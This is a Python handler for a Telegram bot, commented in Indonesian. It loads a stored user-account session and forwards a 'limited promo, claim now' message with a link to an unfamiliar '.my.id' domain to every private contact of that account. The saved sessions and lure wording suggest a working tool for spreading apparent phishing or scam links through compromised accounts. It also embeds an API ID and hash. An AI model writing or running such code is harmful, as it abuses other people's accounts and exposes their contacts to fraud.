from telethon.sync import TelegramClient
from telethon.tl.types import User
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import os, time

API_ID = 23416622  # Ganti dengan punyamu
API_HASH = "d1bc12a03ea26416b38b4616a36112b0"
SESSION_FOLDER = "ew_sessions"

async def broadcast_to_contacts_handler(update, context, phone_number):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    # 1. Bot kirim pesan ke dirinya sendiri dulu
    judul = "🎯 *Promo Terbatas Hari Ini!*"
    keyboard = [
        [InlineKeyboardButton("🔥 Klaim Sekarang", url="https://daftar.update-share2025.my.id/")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    pesan_bot = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=judul,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

    # 2. Ambil message_id yang barusan dikirim oleh bot
    message_id_to_forward = pesan_bot.message_id
    from_chat_id = update.effective_chat.id

    # 3. Mulai forward pesan dari akun session ke kontak
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.start()

        # Ambil semua dialog (kontak)
        dialogs = await client.get_dialogs()
        sent_count = 0

        for dialog in dialogs:
            if isinstance(dialog.entity, User):
                try:
                    await client.forward_messages(
                        entity=dialog.entity.id,
                        messages=message_id_to_forward,
                        from_peer=from_chat_id
                    )
                    sent_count += 1
                    time.sleep(1)  # rate limit aman
                except Exception as e:
                    print(f"Gagal kirim ke {dialog.entity.id}: {e}")

        await update.callback_query.message.reply_text(f"✅ Pesan berhasil diteruskan ke {sent_count} kontak.")
        await client.disconnect()

    except Exception as e:
        await update.callback_query.message.reply_text(f"❌ Error saat broadcast: {e}")
